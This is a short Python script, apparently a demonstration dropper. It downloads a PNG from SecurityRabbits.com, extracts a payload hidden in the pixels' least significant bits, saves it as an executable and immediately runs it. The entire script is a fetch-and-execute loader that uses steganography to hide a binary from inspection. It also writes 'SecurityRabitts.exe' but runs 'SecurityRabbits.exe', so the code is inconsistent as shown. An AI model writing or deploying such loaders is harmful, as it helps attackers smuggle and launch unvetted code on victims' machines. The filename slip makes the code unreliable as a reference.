import subprocess
import requests
import numpy as np
from PIL import Image

def f_b2B(bitstring):
    return bytes(int(bitstring[i:i+8], 2) for i in range(0, len(bitstring), 8))

print("Downloading image...\nhttps://SecurityRabbits.com/longhorn.png")
response = requests.get('https://SecurityRabbits.com/longhorn.png')
with open('longhorn.png', 'wb') as f:
    f.write(response.content)    

print("Extracting payload...")
img         = Image.open('longhorn.png')
pixels      = np.array(img)
rgbpixels   = pixels.reshape(-1, 3)
bits        = ''
for pixel in rgbpixels:
    for rgb in pixel:
        bits += str(rgb & 1)
payload        = bits[:(int(bits[:32], 2) + 4) * 8]
with open('SecurityRabitts.exe', 'wb') as f:
    f.write(f_b2B(payload)[4:])
print("SecurityRabbits.exe is ready.\nRunning...\n")
subprocess.run(["SecurityRabbits.exe"])
